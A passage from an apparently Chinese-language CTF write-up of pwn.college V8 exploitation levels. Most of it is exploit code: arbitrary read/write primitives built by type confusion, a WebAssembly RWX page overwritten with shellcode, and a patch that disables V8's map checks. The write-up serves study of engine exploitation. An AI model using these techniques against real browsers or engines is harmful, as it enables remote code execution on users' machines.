class="line">arr_element_addr = <span class="title function_">get32addr</span>(arr)-<span class="variable constant_">ELEMENT_OFFSET</span>; <span class="comment">//element</span></span><br><span class="line">fake_map_addr = <span class="title function_">get32addr</span>(fake)+<span class="variable constant_">MAP_OFFSET</span>; <span class="comment">//map</span></span><br><span class="line">fake_array = [<span class="title function_">u2f</span>(fake_map_addr+<span class="number">1</span>, <span class="number">750</span>), <span class="title function_">u2f</span>(arr_element_addr+<span class="number">1</span>, <span class="number">100</span>)]; <span class="comment">//map, properties, elements, len</span></span><br><span class="line">fake_obj = <span class="title function_">getfakeobject</span>(<span class="title function_">get32addr</span>(fake_array)+<span class="variable constant_">MAP_OFFSET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbRead64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	addr -= <span class="number">8</span>;</span><br><span class="line">	fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbWrite64</span>(<span class="params">addr, value</span>)&#123;</span><br><span class="line">	addr -= <span class="number">8</span>;</span><br><span class="line">	fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">	fake_obj[<span class="number">0</span>] = <span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr_element_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(arr_element_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title class_">ArbWrite64</span>(arr_element_addr, <span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(arr_element_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="title function_">i2f</span>(<span class="number">0x9090909090909090n</span>),<span class="title function_">i2f</span>(<span class="number">0x2434810101666068n</span>),<span class="title function_">i2f</span>(<span class="number">0x6567b84801010101n</span>),<span class="title function_">i2f</span>(<span class="number">0x48506c667461632fn</span>),<span class="title function_">i2f</span>(<span class="number">0x656c6c6168632fb8n</span>),<span class="title function_">i2f</span>(<span class="number">0x31d231e78948506en</span>),<span class="title function_">i2f</span>(<span class="number">0x0000050f583b6af6n</span>)];</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title class_">ArbRead64</span>(<span class="title function_">get32addr</span>(wasm_instance)+<span class="variable constant_">WASM_PAGE_SIZE</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] WASM Instance ADDR:&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get32addr</span>(wasm_instance).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//console.log(GetAddressOf(fake).toString(16));</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(arr).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// move dataview to RWX memory</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] BUF ADDR:&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="title function_">get32addr</span>(buf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> backing_store_pointer = buf_addr + <span class="number">0x24</span>;</span><br><span class="line">backing_store_addr = <span class="title class_">ArbRead64</span>(backing_store_pointer);</span><br><span class="line"><span class="comment">//caculate full rwx addr</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] RWX PAGE ADDR:&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rwx_page_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(backing_store_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//ArbWrite64(backing_store_pointer, backing_store_addr);</span></span><br><span class="line"><span class="title class_">ArbWrite64</span>(backing_store_pointer,rwx_page_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(backing_store_pointer).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake_obj);</span></span><br><span class="line"><span class="comment">// copy shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setFloat64</span>(<span class="number">8</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jump to RWX memory</span></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p>這次是 patch 了進入 JIT 後不檢查 MAP 值，也就是可以偷換類別?!<br>但，問題就是，怎麼穩定進入 JIT 去改？<br><strong>patch</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/turboshaft/machine-lowering-reducer-inl.<span class="property">h</span> b/src/compiler/turboshaft/machine-lowering-reducer-inl.<span class="property">h</span></span><br><span class="line">index 170db78717b..17b0fe5c4e9 <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/turboshaft/machine-lowering-reducer-inl.<span class="property">h</span></span><br><span class="line">+++ b/src/compiler/turboshaft/machine-lowering-reducer-inl.<span class="property">h</span></span><br><span class="line">@@ -<span class="number">2740</span>,<span class="number">7</span> +<span class="number">2740</span>,<span class="number">7</span> @@ <span class="keyword">class</span> <span class="title class_">MachineLoweringReducer</span> : public <span class="title class_">Next</span> &#123;</span><br><span class="line">                             <span class="keyword">const</span> <span class="title class_">ZoneRefSet</span>&lt;<span class="title class_">Map</span>&gt;&amp; maps, <span class="title class_">CheckMapsFlags</span> flags,</span><br><span class="line">                             <span class="keyword">const</span> <span class="title class_">FeedbackSource</span>&amp; feedback) &#123;</span><br><span class="line">     <span class="keyword">if</span> (maps.<span class="title function_">is_empty</span>()) &#123;</span><br><span class="line">-      __ <span class="title class_">Deoptimize</span>(frame_state, <span class="title class_">DeoptimizeReason</span>::kWrongMap, feedback);</span><br><span class="line">+      <span class="comment">//__ Deoptimize(frame_state, DeoptimizeReason::kWrongMap, feedback);</span></span><br><span class="line">       <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">@@ -<span class="number">2749</span>,<span class="number">14</span> +<span class="number">2749</span>,<span class="number">14</span> @@ <span class="keyword">class</span> <span class="title class_">MachineLoweringReducer</span> : public <span class="title class_">Next</span> &#123;</span><br><span class="line">       <span class="variable constant_">IF_NOT</span> (<span class="title function_">LIKELY</span>(<span class="title class_">CompareMapAgainstMultipleMaps</span>(heap_object_map, maps))) &#123;</span><br><span class="line">         <span class="comment">// Reloading the map slightly reduces register pressure, and we are on a</span></span><br><span class="line">         <span class="comment">// slow path here anyway.</span></span><br><span class="line">-        <span class="title class_">MigrateInstanceOrDeopt</span>(heap_object, __ <span class="title class_">LoadMapField</span>(heap_object),</span><br><span class="line">-                               frame_state, feedback);</span><br><span class="line">-        __ <span class="title class_">DeoptimizeIfNot</span>(__ <span class="title class_">CompareMaps</span>(heap_object, maps), frame_state,</span><br><span class="line">-                           <span class="title class_">DeoptimizeReason</span>::kWrongMap, feedback);</span><br><span class="line">+        <span class="comment">//MigrateInstanceOrDeopt(heap_object, __ LoadMapField(heap_object),</span></span><br><span class="line">+        <span class="comment">//                       frame_state, feedback);</span></span><br><span class="line">+        <span class="comment">//__ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,</span></span><br><span class="line">+        <span class="comment">//                   DeoptimizeReason::kWrongMap, feedback);</span></span><br><span class="line">       &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">-      __ <span class="title class_">DeoptimizeIfNot</span>(__ <span class="title class_">CompareMaps</span>(heap_object, maps), frame_state,</span><br><span class="line">-                         <span class="title class_">DeoptimizeReason</span>::kWrongMap, feedback);</span><br><span class="line">+      <span class="comment">//__ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,</span></span><br><span class="line">+      <span class="comment">//                   DeoptimizeReason::kWrongMap, feedback);</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// Inserting a AssumeMap so that subsequent optimizations know the map of</span></span><br><span class="line">     <span class="comment">// this object.</span></span><br><span class="line">diff --git a/src/d8/d8.<span class="property">cc</span> b/src/d8/d8.<span class="property">cc</span></span><br><span class="line">index facf0d86d79..382c015bc48 <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.<span class="property">cc</span></span><br><span class="line">+++ b/src/d8/d8.<span class="property">cc</span></span><br><span class="line">@@ -<span class="number">3364</span>,<span class="number">7</span> +<span class="number">3364</span>,<span class="number">7</span> @@ <span class="title class_">Local</span>&lt;<span class="title class_">FunctionTemplate</span>&gt; <span class="title class_">Shell</span>::<span class="title class_">CreateNodeTemplates</span>(</span><br><span class="line"> </span><br><span class="line"> <span class="title class_">Local</span>&lt;<span class="title class_">ObjectTemplate</span>&gt; <span class="title class_">Shell</span>::<span class="title class_">CreateGlobalTemplate</span>(<span class="title class_">Isolate</span>* isolate) &#123;</span><br><span class="line">   <span class="title class_">Local</span>&lt;<span class="title class_">ObjectTemplate</span>&gt; global_template = <span class="title class_">ObjectTemplate</span>::<span class="title class_">New</span>(isolate);</span><br><span class="line">-  global_template-&gt;<span class="title class_">Set</span>(<span class="title class_">Symbol</span>::<span class="title class_">GetToStringTag</span>(isolate),</span><br><span class="line">+<span class="comment">/*  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line"><span class="comment">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span></span><br><span class="line"><span class="comment">   global_template-&gt;Set(isolate, &quot;version&quot;,</span></span><br><span class="line"><span class="comment">                        FunctionTemplate::New(isolate, Version));</span></span><br><span class="line"><span class="comment">@@ -3385,13 +3385,13 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span></span><br><span class="line"><span class="comment">   global_template-&gt;Set(isolate, &quot;readline&quot;,</span></span><br><span class="line"><span class="comment">                        FunctionTemplate::New(isolate, ReadLine));</span></span><br><span class="line"><span class="comment">   global_template-&gt;Set(isolate, &quot;load&quot;,</span></span><br><span class="line"><span class="comment">-                       FunctionTemplate::New(isolate, ExecuteFile));</span></span><br><span class="line"><span class="comment">+                       FunctionTemplate::New(isolate, ExecuteFile));*/</span></span><br><span class="line">   global_template-&gt;<span class="title class_">Set</span>(isolate, <span class="string">&quot;setTimeout&quot;</span>,</span><br><span class="line">                        <span class="title class_">FunctionTemplate</span>::<span class="title class_">New</span>(isolate, <span class="title class_">SetTimeout</span>));</span><br><span class="line">   <span class="comment">// Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span></span><br><span class="line">   <span class="comment">// call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span></span><br><span class="line">   <span class="comment">// we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span></span><br><span class="line">-  <span class="keyword">if</span> (!options.<span class="property">omit_quit</span>) &#123;</span><br><span class="line">+<span class="comment">/*  if (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="comment">     global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span></span><br><span class="line"><span class="comment">   &#125;</span></span><br><span class="line"><span class="comment">   global_template-&gt;Set(isolate, &quot;testRunner&quot;,</span></span><br><span class="line"><span class="comment">@@ -3410,7 +3410,7 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span></span><br><span class="line"><span class="comment">   if (i::v8_flags.expose_async_hooks) &#123;</span></span><br><span class="line"><span class="comment">     global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span></span><br><span class="line"><span class="comment">                          Shell::CreateAsyncHookTemplate(isolate));</span></span><br><span class="line"><span class="comment">-  &#125;</span></span><br><span class="line"><span class="comment">+  &#125;*/</span></span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> global_template;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>看一下最後成功拿到地址的腳本：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get32addr</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> yes = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hit_me</span>(<span class="params"></span>)&#123;<span class="keyword">if</span>(yes)&#123;arr[<span class="number">2</span>] = obj&#125;;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">arr, f</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">0x100</span>;i++);</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="number">1.1</span>;</span><br><span class="line">        <span class="keyword">if</span> (f%<span class="number">0x400</span> == <span class="number">0</span>)&#123;<span class="title function_">hit_me</span>();&#125;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x4000</span>;i++)&#123;<span class="title function_">opt</span>(arr, i)&#125;;</span><br><span class="line">    yes = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2ul</span>(<span class="title function_">opt</span>(arr, <span class="number">0x1000000</span>))-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其實就是在函數內跑多次，讓 opt 被優化掉，那根據前面貼過的文章，進入 JIT 後會最優化，合理的幫每個變數都設定類別，直到出現不一樣的，偵測到了才會退出 JIT，但這邊又把檢察關掉等於可以欺騙他用同類別的方法去對待一個變數造成 Type Confution（  </p>
<p>Exploit 上有個細節就是，拖慢 OPT 的執行速度使他更高機率進入 JIT(本來不知道直到參考了<a target="_blank" rel="noopener" href="https://loora1n.github.io/2024/12/24/%E3%80%90V8%E3%80%91pwncollege%20V8%20Exploitation%20WP%E4%B8%8B/?highlight=v8">https://loora1n.github.io/2024/12/24/%E3%80%90V8%E3%80%91pwncollege%20V8%20Exploitation%20WP%E4%B8%8B/?highlight=v8</a>，才知道有可能會變成另一種優化：MAGLEV)<br>另外有個重點，改變變數的函數必須是另一個外部的函數，不然 JIT 會笨笨的把所有東西一起當一樣的吃過去就做不到 Type Confusion，那 hit_me 函數又必須在優化裡面出現，所以讓他偶爾會被打到！<br>給自己補個坑，要去把 JIT 和 MAGLEV 相關的觸發條件，運作方法重新搞熟(<br>後面就是造成 TYPE CONFUSION 後，蓋 Map 的經典招數了w  </p>
<p>嗎?並不是，因為是走 JIT 然後其實不太懂為什麼跑兩次後就會掛掉(八成是有東西被優化更徹底了<br>最後就是噩夢般的排 OFFSET 時間 QwQ（奇怪的值基本都是，自己找吧），還有硬寫幾個 for loop 去爆破找到 wasm instance 的 map，還有先給 buffer array 一個值賭大概 1&#x2F;2 的機率會搜到對的東西（<br>最後最後，0X13371337 找回去 BUFFER ARRAY 後會變成 WASM 到 RWX PAGE 的 OFFSET 玩蹺蹺板般的爛掉，反正我是找兩個都大概在附近的情況手動+-8 算回正確 EXPLOIT 的(  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> uv = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    fv[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2f</span>(<span class="params">i, j</span>)&#123;</span><br><span class="line">    uv[<span class="number">0</span>]=i;</span><br><span class="line">    uv[<span class="number">1</span>]=j;</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2ul</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2uh</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shift32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> i&lt;&lt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">last32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    dv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get32addr</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> yes = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hit_me</span>(<span class="params"></span>)&#123;<span class="keyword">if</span>(yes)&#123;arr[<span class="number">2</span>] = obj&#125;;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">arr, f</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">0x100</span>;i++);</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="number">1.1</span>;</span><br><span class="line">        <span class="keyword">if</span> (f%<span class="number">0x400</span> == <span class="number">0</span>)&#123;<span class="title function_">hit_me</span>();&#125;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x4000</span>;i++)&#123;<span class="title function_">opt</span>(arr, i)&#125;;</span><br><span class="line">    yes = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2ul</span>(<span class="title function_">opt</span>(arr, <span class="number">0x1000000</span>))-<span class="number">1</span>;</span><br><span 